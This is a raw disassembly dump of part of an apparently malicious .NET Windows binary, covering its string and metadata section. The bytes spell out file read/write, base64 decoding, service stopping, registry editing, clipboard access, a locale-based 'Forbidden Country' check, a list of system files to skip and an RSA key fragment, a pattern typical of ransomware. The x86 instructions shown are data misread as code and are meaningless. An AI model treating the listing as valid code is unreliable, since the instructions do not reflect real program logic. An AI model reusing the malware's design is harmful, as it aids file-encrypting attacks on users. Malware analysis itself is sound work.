  4052e6:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4052ed:	69 65 73 3e 62 5f 5f 	imul   $0x5f5f623e,0x73(%ebp),%esp
  4052f4:	62 00                	bound  %eax,(%eax)
  4052f6:	44                   	inc    %esp
  4052f7:	72 69                	jb     0x405362
  4052f9:	76 65                	jbe    0x405360
  4052fb:	49                   	dec    %ecx
  4052fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4052fd:	66 6f                	outsw  %ds:(%esi),(%dx)
  4052ff:	00 47 65             	add    %al,0x65(%edi)
  405302:	74 44                	je     0x405348
  405304:	72 69                	jb     0x40536f
  405306:	76 65                	jbe    0x40536d
  405308:	73 00                	jae    0x40530a
  40530a:	67 65 74 5f          	addr16 gs je 0x40536d
  40530e:	53                   	push   %ebx
  40530f:	79 73                	jns    0x405384
  405311:	74 65                	je     0x405378
  405313:	6d                   	insl   (%dx),%es:(%edi)
  405314:	44                   	inc    %esp
  405315:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40531c:	79 00                	jns    0x40531e
  40531e:	47                   	inc    %edi
  40531f:	65 74 50             	gs je  0x405372
  405322:	61                   	popa
  405323:	74 68                	je     0x40538d
  405325:	52                   	push   %edx
  405326:	6f                   	outsl  %ds:(%esi),(%dx)
  405327:	6f                   	outsl  %ds:(%esi),(%dx)
  405328:	74 00                	je     0x40532a
  40532a:	41                   	inc    %ecx
  40532b:	70 70                	jo     0x40539d
  40532d:	44                   	inc    %esp
  40532e:	6f                   	outsl  %ds:(%esi),(%dx)
  40532f:	6d                   	insl   (%dx),%es:(%edi)
  405330:	61                   	popa
  405331:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  405338:	43                   	inc    %ebx
  405339:	75 72                	jne    0x4053ad
  40533b:	72 65                	jb     0x4053a2
  40533d:	6e                   	outsb  %ds:(%esi),(%dx)
  40533e:	74 44                	je     0x405384
  405340:	6f                   	outsl  %ds:(%esi),(%dx)
  405341:	6d                   	insl   (%dx),%es:(%edi)
  405342:	61                   	popa
  405343:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  40534a:	46                   	inc    %esi
  40534b:	72 69                	jb     0x4053b6
  40534d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40534f:	64 6c                	fs insb (%dx),%es:(%edi)
  405351:	79 4e                	jns    0x4053a1
  405353:	61                   	popa
  405354:	6d                   	insl   (%dx),%es:(%edi)
  405355:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  405359:	61                   	popa
  40535a:	64 41                	fs inc %ecx
  40535c:	6c                   	insb   (%dx),%es:(%edi)
  40535d:	6c                   	insb   (%dx),%es:(%edi)
  40535e:	42                   	inc    %edx
  40535f:	79 74                	jns    0x4053d5
  405361:	65 73 00             	gs jae 0x405364
  405364:	57                   	push   %edi
  405365:	72 69                	jb     0x4053d0
  405367:	74 65                	je     0x4053ce
  405369:	41                   	inc    %ecx
  40536a:	6c                   	insb   (%dx),%es:(%edi)
  40536b:	6c                   	insb   (%dx),%es:(%edi)
  40536c:	42                   	inc    %edx
  40536d:	79 74                	jns    0x4053e3
  40536f:	65 73 00             	gs jae 0x405372
  405372:	50                   	push   %eax
  405373:	72 6f                	jb     0x4053e4
  405375:	63 65 73             	arpl   %esp,0x73(%ebp)
  405378:	73 53                	jae    0x4053cd
  40537a:	74 61                	je     0x4053dd
  40537c:	72 74                	jb     0x4053f2
  40537e:	49                   	dec    %ecx
  40537f:	6e                   	outsb  %ds:(%esi),(%dx)
  405380:	66 6f                	outsw  %ds:(%esi),(%dx)
  405382:	00 73 65             	add    %dh,0x65(%ebx)
  405385:	74 5f                	je     0x4053e6
  405387:	57                   	push   %edi
  405388:	6f                   	outsl  %ds:(%esi),(%dx)
  405389:	72 6b                	jb     0x4053f6
  40538b:	69 6e 67 44 69 72 65 	imul   $0x65726944,0x67(%esi),%ebp
  405392:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  405396:	79 00                	jns    0x405398
  405398:	73 65                	jae    0x4053ff
  40539a:	74 5f                	je     0x4053fb
  40539c:	53                   	push   %ebx
  40539d:	74 61                	je     0x405400
  40539f:	72 74                	jb     0x405415
  4053a1:	49                   	dec    %ecx
  4053a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4053a3:	66 6f                	outsw  %ds:(%esi),(%dx)
  4053a5:	00 73 65             	add    %dh,0x65(%ebx)
  4053a8:	74 5f                	je     0x405409
  4053aa:	55                   	push   %ebp
  4053ab:	73 65                	jae    0x405412
  4053ad:	53                   	push   %ebx
  4053ae:	68 65 6c 6c 45       	push   $0x456c6c65
  4053b3:	78 65                	js     0x40541a
  4053b5:	63 75 74             	arpl   %esi,0x74(%ebp)
  4053b8:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4053bc:	74 5f                	je     0x40541d
  4053be:	56                   	push   %esi
  4053bf:	65 72 62             	gs jb  0x405424
  4053c2:	00 50 72             	add    %dl,0x72(%eax)
  4053c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4053c6:	63 65 73             	arpl   %esp,0x73(%ebp)
  4053c9:	73 57                	jae    0x405422
  4053cb:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4053d2:	79 6c                	jns    0x405440
  4053d4:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4053d8:	74 5f                	je     0x405439
  4053da:	57                   	push   %edi
  4053db:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4053e2:	79 6c                	jns    0x405450
  4053e4:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  4053e8:	73 74                	jae    0x40545e
  4053ea:	65 6d                	gs insl (%dx),%es:(%edi)
  4053ec:	2e 43                	cs inc %ebx
  4053ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4053ef:	6d                   	insl   (%dx),%es:(%edi)
  4053f0:	70 6f                	jo     0x405461
  4053f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4053f3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4053f5:	74 4d                	je     0x405444
  4053f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4053f8:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  4053fb:	00 57 69             	add    %dl,0x69(%edi)
  4053fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4053ff:	33 32                	xor    (%edx),%esi
  405401:	45                   	inc    %ebp
  405402:	78 63                	js     0x405467
  405404:	65 70 74             	gs jo  0x40547b
  405407:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40540e:	5f                   	pop    %edi
  40540f:	4e                   	dec    %esi
  405410:	61                   	popa
  405411:	74 69                	je     0x40547c
  405413:	76 65                	jbe    0x40547a
  405415:	45                   	inc    %ebp
  405416:	72 72                	jb     0x40548a
  405418:	6f                   	outsl  %ds:(%esi),(%dx)
  405419:	72 43                	jb     0x40545e
  40541b:	6f                   	outsl  %ds:(%esi),(%dx)
  40541c:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  405421:	74 5f                	je     0x405482
  405423:	50                   	push   %eax
  405424:	72 6f                	jb     0x405495
  405426:	63 65 73             	arpl   %esp,0x73(%ebp)
  405429:	73 4e                	jae    0x405479
  40542b:	61                   	popa
  40542c:	6d                   	insl   (%dx),%es:(%edi)
  40542d:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  405431:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
  405438:	00 
  405439:	52                   	push   %edx
  40543a:	65 70 6c             	gs jo  0x4054a9
  40543d:	61                   	popa
  40543e:	63 65 00             	arpl   %esp,0x0(%ebp)
  405441:	4f                   	dec    %edi
  405442:	70 65                	jo     0x4054a9
  405444:	6e                   	outsb  %ds:(%esi),(%dx)
  405445:	53                   	push   %ebx
  405446:	75 62                	jne    0x4054aa
  405448:	4b                   	dec    %ebx
  405449:	65 79 00             	gs jns 0x40544c
  40544c:	53                   	push   %ebx
  40544d:	65 74 56             	gs je  0x4054a6
  405450:	61                   	popa
  405451:	6c                   	insb   (%dx),%es:(%edi)
  405452:	75 65                	jne    0x4054b9
  405454:	00 43 6f             	add    %al,0x6f(%ebx)
  405457:	70 79                	jo     0x4054d2
  405459:	00 73 65             	add    %dh,0x65(%ebx)
  40545c:	74 5f                	je     0x4054bd
  40545e:	46                   	inc    %esi
  40545f:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405466:	00 
  405467:	73 65                	jae    0x4054ce
  405469:	74 5f                	je     0x4054ca
  40546b:	41                   	inc    %ecx
  40546c:	72 67                	jb     0x4054d5
  40546e:	75 6d                	jne    0x4054dd
  405470:	65 6e                	outsb  %gs:(%esi),(%dx)
  405472:	74 73                	je     0x4054e7
  405474:	00 57 61             	add    %dl,0x61(%edi)
  405477:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%esi,%eax,2),%esi
  40547e:	69 
  40547f:	74 00                	je     0x405481
  405481:	53                   	push   %ebx
  405482:	79 73                	jns    0x4054f7
  405484:	74 65                	je     0x4054eb
  405486:	6d                   	insl   (%dx),%es:(%edi)
  405487:	2e 53                	cs push %ebx
  405489:	65 72 76             	gs jb  0x405502
  40548c:	69 63 65 50 72 6f 63 	imul   $0x636f7250,0x65(%ebx),%esp
  405493:	65 73 73             	gs jae 0x405509
  405496:	00 53 65             	add    %dl,0x65(%ebx)
  405499:	72 76                	jb     0x405511
  40549b:	69 63 65 43 6f 6e 74 	imul   $0x746e6f43,0x65(%ebx),%esp
  4054a2:	72 6f                	jb     0x405513
  4054a4:	6c                   	insb   (%dx),%es:(%edi)
  4054a5:	6c                   	insb   (%dx),%es:(%edi)
  4054a6:	65 72 00             	gs jb  0x4054a9
  4054a9:	53                   	push   %ebx
  4054aa:	74 6f                	je     0x40551b
  4054ac:	70 00                	jo     0x4054ae
  4054ae:	47                   	inc    %edi
  4054af:	65 74 54             	gs je  0x405506
  4054b2:	65 6d                	gs insl (%dx),%es:(%edi)
  4054b4:	70 50                	jo     0x405506
  4054b6:	61                   	popa
  4054b7:	74 68                	je     0x405521
  4054b9:	00 46 72             	add    %al,0x72(%esi)
  4054bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4054bd:	6d                   	insl   (%dx),%es:(%edi)
  4054be:	42                   	inc    %edx
  4054bf:	61                   	popa
  4054c0:	73 65                	jae    0x405527
  4054c2:	36 34 53             	ss xor $0x53,%al
  4054c5:	74 72                	je     0x405539
  4054c7:	69 6e 67 00 2e 63 63 	imul   $0x63632e00,0x67(%esi),%ebp
  4054ce:	74 6f                	je     0x40553f
  4054d0:	72 00                	jb     0x4054d2
  4054d2:	67 65 74 5f          	addr16 gs je 0x405535
  4054d6:	55                   	push   %ebp
  4054d7:	73 65                	jae    0x40553e
  4054d9:	72 4e                	jb     0x405529
  4054db:	61                   	popa
  4054dc:	6d                   	insl   (%dx),%es:(%edi)
  4054dd:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  4054e1:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  4054e5:	74 50                	je     0x405537
  4054e7:	74 72                	je     0x40555b
  4054e9:	00 43 6f             	add    %al,0x6f(%ebx)
  4054ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4054ed:	74 72                	je     0x405561
  4054ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4054f0:	6c                   	insb   (%dx),%es:(%edi)
  4054f1:	00 67 65             	add    %ah,0x65(%edi)
  4054f4:	74 5f                	je     0x405555
  4054f6:	48                   	dec    %eax
  4054f7:	61                   	popa
  4054f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4054f9:	64 6c                	fs insb (%dx),%es:(%edi)
  4054fb:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  4054ff:	74 63                	je     0x405564
  405501:	68 00 47 72 6f       	push   $0x6f724700
  405506:	75 70                	jne    0x405578
  405508:	00 67 65             	add    %ah,0x65(%edi)
  40550b:	74 5f                	je     0x40556c
  40550d:	53                   	push   %ebx
  40550e:	75 63                	jne    0x405573
  405510:	63 65 73             	arpl   %esp,0x73(%ebp)
  405513:	73 00                	jae    0x405515
  405515:	67 65 74 5f          	addr16 gs je 0x405578
  405519:	4d                   	dec    %ebp
  40551a:	73 67                	jae    0x405583
  40551c:	00 53 74             	add    %dl,0x74(%ebx)
  40551f:	61                   	popa
  405520:	72 74                	jb     0x405596
  405522:	73 57                	jae    0x40557b
  405524:	69 74 68 00 67 65 74 	imul   $0x5f746567,0x0(%eax,%ebp,2),%esi
  40552b:	5f 
  40552c:	45                   	inc    %ebp
  40552d:	78 53                	js     0x405582
  40552f:	74 79                	je     0x4055aa
  405531:	6c                   	insb   (%dx),%es:(%edi)
  405532:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405536:	74 5f                	je     0x405597
  405538:	45                   	inc    %ebp
  405539:	78 53                	js     0x40558e
  40553b:	74 79                	je     0x4055b6
  40553d:	6c                   	insb   (%dx),%es:(%edi)
  40553e:	65 00 3c 3e          	add    %bh,%gs:(%esi,%edi,1)
  405542:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  405545:	44                   	inc    %esp
  405546:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40554d:	6c                   	insb   (%dx),%es:(%edi)
  40554e:	61                   	popa
  40554f:	73 73                	jae    0x4055c4
  405551:	31 00                	xor    %eax,(%eax)
  405553:	52                   	push   %edx
  405554:	65 74 75             	gs je  0x4055cc
  405557:	72 6e                	jb     0x4055c7
  405559:	56                   	push   %esi
  40555a:	61                   	popa
  40555b:	6c                   	insb   (%dx),%es:(%edi)
  40555c:	75 65                	jne    0x4055c3
  40555e:	00 3c 47             	add    %bh,(%edi,%eax,2)
  405561:	65 74 54             	gs je  0x4055b8
  405564:	65 78 74             	gs js  0x4055db
  405567:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40556b:	30 00                	xor    %al,(%eax)
  40556d:	43                   	inc    %ebx
  40556e:	6c                   	insb   (%dx),%es:(%edi)
  40556f:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  405576:	00 45 6d             	add    %al,0x6d(%ebp)
  405579:	70 74                	jo     0x4055ef
  40557b:	79 00                	jns    0x40557d
  40557d:	41                   	inc    %ecx
  40557e:	70 61                	jo     0x4055e1
  405580:	72 74                	jb     0x4055f6
  405582:	6d                   	insl   (%dx),%es:(%edi)
  405583:	65 6e                	outsb  %gs:(%esi),(%dx)
  405585:	74 53                	je     0x4055da
  405587:	74 61                	je     0x4055ea
  405589:	74 65                	je     0x4055f0
  40558b:	00 53 65             	add    %dl,0x65(%ebx)
  40558e:	74 41                	je     0x4055d1
  405590:	70 61                	jo     0x4055f3
  405592:	72 74                	jb     0x405608
  405594:	6d                   	insl   (%dx),%es:(%edi)
  405595:	65 6e                	outsb  %gs:(%esi),(%dx)
  405597:	74 53                	je     0x4055ec
  405599:	74 61                	je     0x4055fc
  40559b:	74 65                	je     0x405602
  40559d:	00 4a 6f             	add    %cl,0x6f(%edx)
  4055a0:	69 6e 00 3c 3e 63 5f 	imul   $0x5f633e3c,0x0(%esi),%ebp
  4055a7:	5f                   	pop    %edi
  4055a8:	44                   	inc    %esp
  4055a9:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4055b0:	6c                   	insb   (%dx),%es:(%edi)
  4055b1:	61                   	popa
  4055b2:	73 73                	jae    0x405627
  4055b4:	34 00                	xor    $0x0,%al
  4055b6:	3c 53                	cmp    $0x53,%al
  4055b8:	65 74 54             	gs je  0x40560f
  4055bb:	65 78 74             	gs js  0x405632
  4055be:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  4055c2:	33 00                	xor    (%eax),%eax
  4055c4:	00 23                	add    %ah,(%ebx)
  4055c6:	46                   	inc    %esi
  4055c7:	00 6f 00             	add    %ch,0x0(%edi)
  4055ca:	72 00                	jb     0x4055cc
  4055cc:	62 00                	bound  %eax,(%eax)
  4055ce:	69 00 64 00 64 00    	imul   $0x640064,(%eax),%eax
  4055d4:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4055d8:	20 00                	and    %al,(%eax)
  4055da:	43                   	inc    %ebx
  4055db:	00 6f 00             	add    %ch,0x0(%edi)
  4055de:	75 00                	jne    0x4055e0
  4055e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4055e1:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4055e5:	00 79 00             	add    %bh,0x0(%ecx)
  4055e8:	00 15 61 00 7a 00    	add    %dl,0x7a0061
  4055ee:	2d 00 4c 00 61       	sub    $0x61004c00,%eax
  4055f3:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  4055f7:	00 2d 00 41 00 5a    	add    %ch,0x5a004100
  4055fd:	00 01                	add    %al,(%ecx)
  4055ff:	0b 74 00 72          	or     0x72(%eax,%eax,1),%esi
  405603:	00 2d 00 54 00 52    	add    %ch,0x52005400
  405609:	00 01                	add    %al,(%ecx)
  40560b:	13 53 00             	adc    0x0(%ebx),%edx
  40560e:	6f                   	outsl  %ds:(%esi),(%dx)
  40560f:	00 66 00             	add    %ah,0x0(%esi)
  405612:	74 00                	je     0x405614
  405614:	77 00                	ja     0x405616
  405616:	61                   	popa
  405617:	00 72 00             	add    %dh,0x0(%edx)
  40561a:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40561f:	49                   	dec    %ecx
  405620:	61                   	popa
  405621:	00 62 00             	add    %ah,0x0(%edx)
  405624:	63 00                	arpl   %eax,(%eax)
  405626:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40562a:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40562e:	68 00 69 00 6a       	push   $0x6a006900
  405633:	00 6b 00             	add    %ch,0x0(%ebx)
  405636:	6c                   	insb   (%dx),%es:(%edi)
  405637:	00 6d 00             	add    %ch,0x0(%ebp)
  40563a:	6e                   	outsb  %ds:(%esi),(%dx)
  40563b:	00 6f 00             	add    %ch,0x0(%edi)
  40563e:	70 00                	jo     0x405640
  405640:	71 00                	jno    0x405642
  405642:	72 00                	jb     0x405644
  405644:	73 00                	jae    0x405646
  405646:	74 00                	je     0x405648
  405648:	75 00                	jne    0x40564a
  40564a:	76 00                	jbe    0x40564c
  40564c:	77 00                	ja     0x40564e
  40564e:	78 00                	js     0x405650
  405650:	79 00                	jns    0x405652
  405652:	7a 00                	jp     0x405654
  405654:	30 00                	xor    %al,(%eax)
  405656:	31 00                	xor    %eax,(%eax)
  405658:	32 00                	xor    (%eax),%al
  40565a:	33 00                	xor    (%eax),%eax
  40565c:	34 00                	xor    $0x0,%al
  40565e:	35 00 36 00 37       	xor    $0x37003600,%eax
  405663:	00 38                	add    %bh,(%eax)
  405665:	00 39                	add    %bh,(%ecx)
  405667:	00 00                	add    %al,(%eax)
  405669:	01 00                	add    %eax,(%eax)
  40566b:	03 2f                	add    (%edi),%ebp
  40566d:	00 00                	add    %al,(%eax)
  40566f:	1b 61 00             	sbb    0x0(%ecx),%esp
  405672:	70 00                	jo     0x405674
  405674:	70 00                	jo     0x405676
  405676:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40567a:	74 00                	je     0x40567c
  40567c:	61                   	popa
  40567d:	00 5c 00 6c          	add    %bl,0x6c(%eax,%eax,1)
  405681:	00 6f 00             	add    %ch,0x0(%edi)
  405684:	63 00                	arpl   %eax,(%eax)
  405686:	61                   	popa
  405687:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40568b:	21 61 00             	and    %esp,0x0(%ecx)
  40568e:	70 00                	jo     0x405690
  405690:	70 00                	jo     0x405692
  405692:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  405696:	74 00                	je     0x405698
  405698:	61                   	popa
  405699:	00 5c 00 6c          	add    %bl,0x6c(%eax,%eax,1)
  40569d:	00 6f 00             	add    %ch,0x0(%edi)
  4056a0:	63 00                	arpl   %eax,(%eax)
  4056a2:	61                   	popa
  4056a3:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4056a7:	00 6f 00             	add    %ch,0x0(%edi)
  4056aa:	77 00                	ja     0x4056ac
  4056ac:	00 1f                	add    %bl,(%edi)
  4056ae:	75 00                	jne    0x4056b0
  4056b0:	73 00                	jae    0x4056b2
  4056b2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4056b6:	73 00                	jae    0x4056b8
  4056b8:	5c                   	pop    %esp
  4056b9:	00 61 00             	add    %ah,0x0(%ecx)
  4056bc:	6c                   	insb   (%dx),%es:(%edi)
  4056bd:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4056c1:	00 75 00             	add    %dh,0x0(%ebp)
  4056c4:	73 00                	jae    0x4056c6
  4056c6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4056ca:	73 00                	jae    0x4056cc
  4056cc:	00 19                	add    %bl,(%ecx)
  4056ce:	5c                   	pop    %esp
  4056cf:	00 50 00             	add    %dl,0x0(%eax)
  4056d2:	72 00                	jb     0x4056d4
  4056d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4056d5:	00 67 00             	add    %ah,0x0(%edi)
  4056d8:	72 00                	jb     0x4056da
  4056da:	61                   	popa
  4056db:	00 6d 00             	add    %ch,0x0(%ebp)
  4056de:	44                   	inc    %esp
  4056df:	00 61 00             	add    %ah,0x0(%ecx)
  4056e2:	74 00                	je     0x4056e4
  4056e4:	61                   	popa
  4056e5:	00 00                	add    %al,(%eax)
  4056e7:	11 62 00             	adc    %esp,0x0(%edx)
  4056ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4056eb:	00 6f 00             	add    %ch,0x0(%edi)
  4056ee:	74 00                	je     0x4056f0
  4056f0:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  4056f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4056f5:	00 69 00             	add    %ch,0x0(%ecx)
  4056f8:	00 19                	add    %bl,(%ecx)
  4056fa:	62 00                	bound  %eax,(%eax)
  4056fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4056fd:	00 6f 00             	add    %ch,0x0(%edi)
  405700:	74 00                	je     0x405702
  405702:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  405706:	6e                   	outsb  %ds:(%esi),(%dx)
  405707:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  40570b:	00 62 00             	add    %ah,0x0(%edx)
  40570e:	69 00 6e 00 00 19    	imul   $0x1900006e,(%eax),%eax
  405714:	69 00 63 00 6f 00    	imul   $0x6f0063,(%eax),%eax
  40571a:	6e                   	outsb  %ds:(%esi),(%dx)
  40571b:	00 63 00             	add    %ah,0x0(%ebx)
  40571e:	61                   	popa
  40571f:	00 63 00             	add    %ah,0x0(%ebx)
  405722:	68 00 65 00 2e       	push   $0x2e006500
  405727:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40572b:	00 00                	add    %al,(%eax)
  40572d:	15 6e 00 74 00       	adc    $0x74006e,%eax
  405732:	75 00                	jne    0x405734
  405734:	73 00                	jae    0x405736
  405736:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40573a:	2e 00 64 00 61       	add    %ah,%cs:0x61(%eax,%eax,1)
  40573f:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  405743:	1d 6e 00 74 00       	sbb    $0x74006e,%eax
  405748:	75 00                	jne    0x40574a
  40574a:	73 00                	jae    0x40574c
  40574c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405750:	2e 00 64 00 61       	add    %ah,%cs:0x61(%eax,%eax,1)
  405755:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  405759:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40575d:	00 67 00             	add    %ah,0x0(%edi)
  405760:	00 15 6e 00 74 00    	add    %dl,0x74006e
  405766:	75 00                	jne    0x405768
  405768:	73 00                	jae    0x40576a
  40576a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40576e:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  405772:	6e                   	outsb  %ds:(%esi),(%dx)
  405773:	00 69 00             	add    %ch,0x0(%ecx)
  405776:	00 13                	add    %dl,(%ebx)
  405778:	74 00                	je     0x40577a
  40577a:	68 00 75 00 6d       	push   $0x6d007500
  40577f:	00 62 00             	add    %ah,0x0(%edx)
  405782:	73 00                	jae    0x405784
  405784:	2e 00 64 00 62       	add    %ah,%cs:0x62(%eax,%eax,1)
  405789:	00 00                	add    %al,(%eax)
  40578b:	17                   	pop    %ss
  40578c:	61                   	popa
  40578d:	00 75 00             	add    %dh,0x0(%ebp)
  405790:	74 00                	je     0x405792
  405792:	6f                   	outsl  %ds:(%esi),(%dx)
  405793:	00 72 00             	add    %dh,0x0(%edx)
  405796:	75 00                	jne    0x405798
  405798:	6e                   	outsb  %ds:(%esi),(%dx)
  405799:	00 2e                	add    %ch,(%esi)
  40579b:	00 69 00             	add    %ch,0x0(%ecx)
  40579e:	6e                   	outsb  %ds:(%esi),(%dx)
  40579f:	00 66 00             	add    %ah,0x0(%esi)
  4057a2:	00 19                	add    %bl,(%ecx)
  4057a4:	62 00                	bound  %eax,(%eax)
  4057a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4057a7:	00 6f 00             	add    %ch,0x0(%edi)
  4057aa:	74 00                	je     0x4057ac
  4057ac:	73 00                	jae    0x4057ae
  4057ae:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4057b2:	74 00                	je     0x4057b4
  4057b4:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  4057b8:	61                   	popa
  4057b9:	00 6b 00             	add    %ch,0x0(%ebx)
  4057bc:	00 19                	add    %bl,(%ecx)
  4057be:	62 00                	bound  %eax,(%eax)
  4057c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4057c1:	00 6f 00             	add    %ch,0x0(%edi)
  4057c4:	74 00                	je     0x4057c6
  4057c6:	6d                   	insl   (%dx),%es:(%edi)
  4057c7:	00 67 00             	add    %ah,0x0(%edi)
  4057ca:	66 00 77 00          	data16 add %dh,0x0(%edi)
  4057ce:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4057d2:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  4057d6:	00 17                	add    %dl,(%edi)
  4057d8:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4057dc:	73 00                	jae    0x4057de
  4057de:	6b 00 74             	imul   $0x74,(%eax),%eax
  4057e1:	00 6f 00             	add    %ch,0x0(%edi)
  4057e4:	70 00                	jo     0x4057e6
  4057e6:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  4057ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4057eb:	00 69 00             	add    %ch,0x0(%ecx)
  4057ee:	00 4f 3c             	add    %cl,0x3c(%edi)
  4057f1:	00 3f                	add    %bh,(%edi)
  4057f3:	00 78 00             	add    %bh,0x0(%eax)
  4057f6:	6d                   	insl   (%dx),%es:(%edi)
  4057f7:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4057fb:	00 76 00             	add    %dh,0x0(%esi)
  4057fe:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405802:	73 00                	jae    0x405804
  405804:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40580a:	3d 00 22 00 31       	cmp    $0x31002200,%eax
  40580f:	00 2e                	add    %ch,(%esi)
  405811:	00 30                	add    %dh,(%eax)
  405813:	00 22                	add    %ah,(%edx)
  405815:	00 20                	add    %ah,(%eax)
  405817:	00 65 00             	add    %ah,0x0(%ebp)
  40581a:	6e                   	outsb  %ds:(%esi),(%dx)
  40581b:	00 63 00             	add    %ah,0x0(%ebx)
  40581e:	6f                   	outsl  %ds:(%esi),(%dx)
  40581f:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  405823:	00 6e 00             	add    %ch,0x0(%esi)
  405826:	67 00 3d             	add    %bh,(%di)
  405829:	00 22                	add    %ah,(%edx)
  40582b:	00 75 00             	add    %dh,0x0(%ebp)
  40582e:	74 00                	je     0x405830
  405830:	66 00 2d 00 31 00 36 	data16 add %ch,0x36003100
  405837:	00 22                	add    %ah,(%edx)
  405839:	00 3f                	add    %bh,(%edi)
  40583b:	00 3e                	add    %bh,(%esi)
  40583d:	00 01                	add    %al,(%ecx)
  40583f:	80 e5 3c             	and    $0x3c,%ch
  405842:	00 52 00             	add    %dl,0x0(%edx)
  405845:	53                   	push   %ebx
  405846:	00 41 00             	add    %al,0x0(%ecx)
  405849:	50                   	push   %eax
  40584a:	00 61 00             	add    %ah,0x0(%ecx)
  40584d:	72 00                	jb     0x40584f
  40584f:	61                   	popa
  405850:	00 6d 00             	add    %ch,0x0(%ebp)
  405853:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
  405858:	00 72 00             	add    %dh,0x0(%edx)
  40585b:	73 00                	jae    0x40585d
  40585d:	20 00                	and    %al,(%eax)
  40585f:	78 00                	js     0x405861
  405861:	6d                   	insl   (%dx),%es:(%edi)
  405862:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  405866:	00 73 00             	add    %dh,0x0(%ebx)
  405869:	3a 00                	cmp    (%eax),%al
  40586b:	78 00                	js     0x40586d
  40586d:	73 00                	jae    0x40586f
  40586f:	64 00 3d 00 22 00 68 	add    %bh,%fs:0x68002200
  405876:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
